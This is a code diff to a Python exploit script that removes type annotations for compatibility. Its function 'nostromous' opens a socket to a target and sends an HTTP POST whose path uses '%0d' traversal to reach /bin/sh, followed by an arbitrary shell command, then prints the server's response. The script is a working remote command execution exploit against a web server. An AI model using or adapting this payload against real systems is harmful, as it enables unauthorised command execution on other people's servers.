@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+# coding: utf-8
 
 from sys import version_info
 if version_info < (3, 6):
@@ -30,11 +31,11 @@ title = """
 """
 
 
-def connect(sock:socket.socket) -> str:
-    buffer: StringIO = StringIO()
+def connect(sock):
+    buffer = StringIO()
     try:
         while True:
-            connection: bytes = sock.recv(0x400)
+            connection = sock.recv(0x400)
             if connection.__len__():
                 buffer.write(connection)
             else:
@@ -44,17 +45,17 @@ def connect(sock:socket.socket) -> str:
     return buffer.getvalue()
 
 
-def nostromous(target: str, port: int, command: str):
-    sock: socket.socket = socket.socket()
+def nostromous(target, port, command):
+    sock = socket.socket()
     print("[!] CONNECTING TO {0} ON PORT {1}".format(target, port))
     sock.connect((target, port))
-    payload: str = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: ' \
+    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: ' \
                    '1\r\n\r\necho\necho\n{0} 2>&1'.format(command)
     print("[!] EXECUTING PAYLOAD")
     print("[*] {0}".format(payload.encode()))
     sock.send(payload.encode())
     print("\n[!] OPEN FOR RESPONSE")
-    response: str = connect(sock)
+    response = connect(sock)
     print('[@] {0}'.format(response) if response else '[@] NO DATA RECEIVED')
 
 
